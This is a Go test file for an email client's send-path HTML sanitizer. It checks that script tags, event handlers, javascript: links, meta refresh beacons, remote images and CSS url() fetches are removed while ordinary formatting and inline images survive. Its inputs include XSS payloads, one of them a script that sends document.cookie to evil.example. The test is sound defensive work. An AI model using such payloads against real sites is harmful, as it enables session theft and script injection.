// SPDX-License-Identifier: AGPL-3.0-only

package api

import (
	"strings"
	"testing"
)

// SanitizeOutboundHTML is the SEND-path sanitizer (Forgejo #46): the rich body a
// client composes, cleaned before it becomes the text/html part of the RFC 5322
// bytes Mailroom transmits and files. A rich-text editor is a UI convenience,
// never a security control, so the server does not trust the client's bytes.
//
// The invariant is the same as the read path (sanitize_test.go's assertSafeDOM):
// whatever bytes come out, the DOM a browser would build from them carries no
// element outside the allowlist, no on* handler, no dangerous URL and no fetching
// CSS. It is asserted here on the OUTBOUND output too — the send path must not be
// a weaker sibling of the read path.
func TestSanitizeOutboundHTML(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		want    []string // must survive
		notWant []string // must be gone (on top of forbiddenMarkup)
	}{
		{
			name: "script and event handlers are stripped, formatting survives",
			in: `<p>Hi <b>there</b> and <i>you</i>, <u>read</u> ` +
				`<a href="https://example.com/x">this link</a>.</p>` +
				`<ul><li>one</li><li>two</li></ul>` +
				`<script>fetch("https://evil.example/"+document.cookie)</script>` +
				`<img src="x" onerror="alert(1)">`,
			want: []string{
				"<b>there</b>", "<i>you</i>", "<u>read</u>",
				`href="https://example.com/x"`, "this link",
				"<ul>", "<li>one</li>", "<li>two</li>",
			},
			notWant: []string{"document.cookie", "evil.example", "alert(1)", "onerror"},
		},
		{
			name: "a cid: inline image the editor inserted survives as a real src",
			// This is the case that makes an embedded image render in the
			// recipient's client: the <img src="cid:…"> must keep pointing at the
			// inline attachment part, NOT be blocked or rewritten.
			in:   `<p>logo:</p><img src="cid:img-abc123@inline.mailroom" alt="logo">`,
			want: []string{`src="cid:img-abc123@inline.mailroom"`, "<p>logo:</p>"},
			// The read path's remote-content plumbing must not leak into sent mail.
			notWant: []string{"data-mailroom-remote-src", "data-mailroom-blocked"},
		},
		{
			name:    "a data:image inline image survives; an svg data: image does not",
			in:      `<img src="data:image/png;base64,iVBORw0KGgo="><img src="data:image/svg+xml;base64,PHN2Zz4=">`,
			want:    []string{`src="data:image/png;base64,iVBORw0KGgo="`},
			notWant: []string{"PHN2Zz4="},
		},
		{
			name: "a remote image src is dropped — only inline images travel outbound",
			// The send path is conservative: an inserted image is an inline cid:/
			// data: source (kept above); a REMOTE image only arrives by pasted
			// markup and is not embedded, so mail we send carries no third-party
			// fetch. It is NOT parked in a data-mailroom-* attribute either — those
			// are read-path affordances with no meaning to a recipient. The <img>
			// itself survives (allowlisted) but without a fetching src.
			in:   `<p>x</p><img src="https://cdn.example/banner.png" width="600" alt="banner">`,
			want: []string{"<p>x</p>", `alt="banner"`},
			notWant: []string{
				"cdn.example", "data-mailroom-remote-src", "data-mailroom-blocked",
			},
		},
		{
			name:    "a javascript: link is dropped but its text survives",
			in:      `<a href="javascript:alert(1)">click</a>`,
			want:    []string{"click"},
			notWant: []string{"alert(1)", "href="},
		},
		{
			name: "outbound links are NOT rewritten with target/rel",
			// forceLinkSafety is a read-path affordance for OUR sandboxed iframe;
			// baking target=_blank rel=noopener into a message other people read is
			// not our call. The href scheme is still validated.
			in:      `<a href="https://example.com/x">read</a>`,
			want:    []string{`href="https://example.com/x"`, "read"},
			notWant: []string{`target="_blank"`, "noopener"},
		},
		{
			name: "a reply quote (blockquote) survives",
			in: `<p>My answer.</p><p>On Mon, Someone wrote:</p>` +
				`<blockquote>the original message</blockquote>`,
			want: []string{"<blockquote>", "the original message", "My answer."},
		},
		{
			name:    "a meta refresh beacon is removed",
			in:      `<meta http-equiv="refresh" content="0;url=https://evil.example/">` + `<p>body</p>`,
			want:    []string{"<p>body</p>"},
			notWant: []string{"evil.example", "refresh"},
		},
		{
			name:    "css url() fetch in a style attribute is stripped, other declarations kept",
			in:      `<div style="color:blue;background:url('https://tracker.example/p.png')">x</div>`,
			want:    []string{"x", "color:blue"},
			notWant: []string{"tracker.example"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeOutboundHTML(tc.in)
			low := strings.ToLower(got)

			// The same structural invariant the read path is held to.
			assertSafeDOM(t, tc.in, got)

			for _, bad := range forbiddenMarkup {
				if strings.Contains(low, bad) {
					t.Errorf("output contains the forbidden element %q\n  in:  %s\n  out: %s", bad, tc.in, got)
				}
			}
			for _, bad := range tc.notWant {
				if strings.Contains(got, bad) {
					t.Errorf("output still contains %q\n  in:  %s\n  out: %s", bad, tc.in, got)
				}
			}
			for _, want := range tc.want {
				if !strings.Contains(got, want) {
					t.Errorf("output lost legitimate content %q\n  in:  %s\n  out: %s", want, tc.in, got)
				}
			}
		})
	}
}

// Empty in, empty out: a plain-only send passes no HTML, and the sanitizer must
// not invent a body (compose.Build treats an empty HTMLBody as "stay text/plain").
func TestSanitizeOutboundHTMLEmpty(t *testing.T) {
	if got := SanitizeOutboundHTML(""); got != "" {
		t.Errorf("SanitizeOutboundHTML(\"\") = %q, want empty", got)
	}
}

// The send path must be total on hostile input for the same reason the read path
// is: the bytes are attacker-influenced (a hostile or buggy client), and a panic
// here is a failed send at best.
func TestSanitizeOutboundHTMLIsTotal(t *testing.T) {
	for _, in := range append(hostileCorpus(),
		"", "<", "<<<<", strings.Repeat("<div>", 4000),
		"\x00\x01<p>\xff</p>",
	) {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("panic on %.60q: %v", in, r)
				}
			}()
			_ = SanitizeOutboundHTML(in)
		}()
	}
}
